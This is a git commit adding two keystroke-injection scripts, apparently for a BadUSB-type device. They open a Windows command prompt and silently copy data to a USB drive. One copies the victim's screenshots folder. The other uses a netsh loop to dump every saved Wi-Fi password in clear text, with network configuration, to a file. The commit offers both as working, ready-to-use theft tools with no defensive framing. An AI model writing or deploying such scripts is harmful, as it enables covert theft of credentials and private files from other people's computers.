b785b5f5dbf1db64ceb710bc005b71111c7fe32f
WaltuhWyl <114583419+WaltuhWyl@users.noreply.github.com>
2024-01-25 20:54:38 +0000

    adding funcional wifipasspuller.js

---
+++ mine/screenshotpuller.js
@@ -0,0 +1,13 @@
+layout('us');
+press("GUI r");
+delay(500) ;
+type("cmd")
+press("ENTER");
+delay(1000);
+type(("xcopy %userprofile%\\pictures\\screenshots G:\\pliki")) //change the drive letter to the one your usb is
+press("ENTER");
+type("D")
+press("ENTER");
+delay(10000);
+type("exit")
+press("ENTER")
---
+++ mine/wifipasspuller.js
@@ -0,0 +1,11 @@
+layout('us');
+press("GUI r");
+delay(500) ;
+type("cmd")
+press("ENTER");
+delay(1000);
+type("(((mode con:cols=100 lines=3000) & for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear) & ipconfig -all) > G:\wifipass.txt") //change the drive letter to the one your usb is
+press("ENTER");
+delay(10000);
+type("exit")
+press("ENTER")
